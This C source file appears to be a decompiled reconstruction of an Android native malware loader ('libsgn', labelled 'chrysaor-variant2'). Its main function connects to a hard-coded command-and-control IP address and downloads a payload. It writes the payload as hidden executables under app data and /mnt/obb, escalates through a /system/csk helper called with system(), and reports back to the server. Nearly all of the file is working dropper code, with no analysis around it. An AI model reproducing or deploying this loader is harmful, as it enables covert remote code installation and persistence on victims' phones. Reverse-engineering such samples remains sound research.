/*
 * libsgn bootstrap module — JNI_OnLoad, handle_signals, main
 * Ghidra: JNI_OnLoad @ 0x00012100, handle_signals @ 0x00011f10, main @ 0x00011f1c
 */

#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <jni.h>

/* Declarations for cross-module calls */
extern int  socket_connect(int *out_fd, const char *host, unsigned port);
extern int  http_send_request_with_get(const char *gi, const char *bf,
                                        const char *host, int fd);
extern int  http_receive_payload(int fd, void **out_body, size_t *out_len);
extern int  http_send_response_with_post(const char *gi, const char *bf,
                                          const char *host, const void *body,
                                          size_t body_len, int fd);
extern int  file_exists(const char *path);
extern int  write_buffer_as_executable(const char *path, const void *data,
                                        size_t len);
extern void get_random_hexlified_md5(char *out, int out_max);
extern void get_hexlified_md5(const char *data, char *out, int out_max);

#define LIBSGN_C2_HOST      "130.195.234.251"
#define LIBSGN_C2_PORT      80
#define LIBSGN_CSK_PATH     "/system/csk"
#define LIBSGN_COLDBOOT_APP "/data/data/com.network.android/.coldboot_init"
#define LIBSGN_COLDBOOT_OBB "/mnt/obb/.coldboot_init"

jint JNI_OnLoad(JavaVM *vm, void *reserved)
{
    (void)reserved;
    (void)vm;
    return 0x10006;
}

static void handle_sigterm(int sig) { (void)sig; }
static void handle_sigchld(int sig)
{
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0) ;
}

void handle_signals(void)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_sigterm;
    sigaction(SIGTERM, &sa, NULL);
    sa.sa_handler = handle_sigchld;
    sigaction(SIGCHLD, &sa, NULL);
}

int main(int argc, char **argv)
{
    int fd = -1, retries = 3;
    char gi[64], bf[64];
    void *payload = NULL;
    size_t payload_len = 0;

    (void)argc; (void)argv;
    handle_signals();
    memset(gi, 0, sizeof(gi));
    memset(bf, 0, sizeof(bf));
    get_random_hexlified_md5(gi, sizeof(gi));
    get_hexlified_md5("chrysaor-variant2", bf, sizeof(bf));

    while (retries-- > 0) {
        fd = -1;
        if (!socket_connect(&fd, LIBSGN_C2_HOST, LIBSGN_C2_PORT))
            continue;
        if (!http_send_request_with_get(gi, bf, LIBSGN_C2_HOST, fd)) {
            close(fd); fd = -1; continue;
        }
        payload = NULL; payload_len = 0;
        if (http_receive_payload(fd, &payload, &payload_len) == 1
            && payload && payload_len > 0) {
            void *exec = malloc(payload_len);
            if (exec) {
                memcpy(exec, payload, payload_len);
                if (!file_exists(LIBSGN_CSK_PATH)) {
                    write_buffer_as_executable(LIBSGN_COLDBOOT_APP, exec, payload_len);
                    write_buffer_as_executable(LIBSGN_COLDBOOT_OBB, exec, payload_len);
                } else {
                    write_buffer_as_executable("/data/local/tmp/.coldboot_init", exec, payload_len);
                    char cmd[512];
                    snprintf(cmd, sizeof(cmd), "%s %s %s",
                             LIBSGN_CSK_PATH, "/data/local/tmp/.coldboot_init",
                             LIBSGN_COLDBOOT_OBB);
                    system(cmd);
                    chmod(LIBSGN_COLDBOOT_OBB, 0711);
                    unlink("/data/local/tmp/.coldboot_init");
                }
                close(fd); fd = -1;
                if (socket_connect(&fd, LIBSGN_C2_HOST, LIBSGN_C2_PORT))
                    http_send_response_with_post(gi, bf, LIBSGN_COLDBOOT_APP,
                                                 exec, payload_len, fd);
                free(exec);
            }
        }
        if (payload) { free(payload); payload = NULL; }
        if (fd >= 0) { close(fd); fd = -1; }
    }
    return 0;
}
